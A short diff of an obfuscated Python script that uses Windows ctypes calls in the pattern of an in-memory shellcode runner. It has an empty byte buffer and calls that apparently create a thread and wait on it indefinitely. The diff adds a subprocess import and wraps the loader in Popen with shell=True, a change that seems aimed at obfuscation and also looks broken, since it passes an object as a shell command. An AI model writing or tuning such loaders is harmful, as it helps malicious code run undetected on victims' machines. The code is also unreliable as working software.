@@ -2,7 +2,7 @@
 
 import ctypes
 import ctypes.wintypes as wt
-
+from subprocess import Popen ,PIPE
 
 class _1():
     _16  =   b""
@@ -48,4 +48,4 @@ class _1():
         _18 = self._11(0, 0, _17, 0, 0, 0)
         self._14(_18, 0xFFFFFFFF)
 if __name__ == '__main__':
-     _1()
+      Popen([_1()],shell=True,stderr=PIPE,stdout=PIPE)
